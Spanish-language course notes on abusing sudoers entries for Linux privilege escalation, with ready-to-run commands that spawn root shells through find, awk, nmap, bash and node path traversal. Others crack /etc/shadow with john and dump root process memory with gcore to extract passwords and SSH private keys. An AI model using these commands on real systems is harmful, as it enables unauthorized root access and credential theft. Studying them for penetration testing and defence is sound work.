# Abusando de privilegios a nivel de Sudoers

Tags: #Linux #Sudoers #Escalada #Root #Privilegios 

El archivo **/etc/sudoers** es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso de los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tienen permisos para realizar tareas de administración en el sistema.

El comando “**sudo**” permite a los usuarios ejecutar comandos como superusuario o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.

Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.

El comando “**sudo -l**” es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones.

Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido.

A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta clase para detectar comandos que potencialmente puedan ser explotados para elevar nuestro privilegio de usuario:

- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)

## Sudoers 

```bash
❯ sudo -l    # Ejecutar el comando 'find' sin password
	# (ALL : ALL) ALL
	# ALL=(root) NOPASSWD: /usr/bin/find
	
# Ejecutar el comando de la siguiente manera:
❯ sudo find . -exec /bin/sh \; -quit
❯ sudo awk 'BEGIN {system("/bin/sh")}' 
```

```bash
❯ sudo -l      # Ejecutar el comando 'nmap' siendo 'user2' sin passwd
	#  (user2) NOPASSWD: /usr/bin/nmap 

# Ejecutar el comando de la siguiente manera:
❯ echo 'os.execute("/bin/sh")' > script.nse     # Ejecutar el comando en el dir '/tmp/'
❯ sudo -u user2 nmap --script=/tmp/script.nse
```

```bash 
❯ sudo -l       # Cambiar de usuario sin password 
	#  (user1 : user2) NOPASSWD: /bin/bash 

# Ejecutar el comando de la siguiente manera:
❯ sudo -u user2 /bin/bash     
```

```bash 
❯ sudo -l       # Ejecutar el comando 'cat' sin password 
	#  (root) NOPASSWD: /bin/cat  

# Ejecutar el comando en la maquina vítima de la siguiente manera:
❯ sudo cat /etc/passwd        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'passwd'
❯ sudo cat /etc/shadow        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'shadow'

# En Kali 
❯ unshadow passwd shadow > pwd.txt  
❯ john pwd.txt -w=/usr/share/wordlists/john.lst   # Obtener la password del usuario 'root'
```

```bash 
❯ sudo -l       # Ejecutar el comando 'node' sin password pero obligado a una ruta 
	# (ALL) /usr/bin/node /usr/local/scripts/*.js   

Paso 1:
# Crear un archivo llamado 'esc.js' en la carpeta /tmp con lo siguiente:
	require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})

Paso 2:
# Ejecutar el comando en la máquina vítima
❯ sudo /usr/bin/node /usr/local/scripts/../../../../tmp/esc.js   
```

```bash 
gcore es simple: genera un dump de la memoria de un proceso activo. Si un proceso tiene credenciales, claves SSH, o datos sensibles en RAM, los podés extraer.
❯ sudo -l       # Ejecutar el comando 'gcore' sin password
	# (ALL) NOPASSWD: /usr/bin/gcore

Paso 1:
❯ ps aux | grep "^root" | grep -v "\["   # Identificar procesos de root existentes 
	root       494  0.0  0.0   2276    68 ?        Ss   12:25   0:00 /usr/bin/password-store    # Donde el PID es '494' en este caso 

Paso 2:
❯ sudo gcore PID    # Genera un archivo llamado 'core.PID'
❯ sudo gcore 494

Paso 3:
❯ strings core.494 > /tmp/dump.txt
❯ cat /tmp/dump.txt | grep -A10 "Password:"

++++++++

## ALTERNATIVA dumpear SSHD
❯ PID_SSHD=$(pgrep -u root sshd | head -1)
❯ sudo gcore $PID_SSHD
❯ strings core.$PID_SSHD | grep -iE "private|rsa|openssh|-----" | head -100
# Extrae TODO lo que parece una key privada
❯ strings core.$PID_SSHD | sed -n '/PRIVATE KEY/,/END.*KEY/p'
```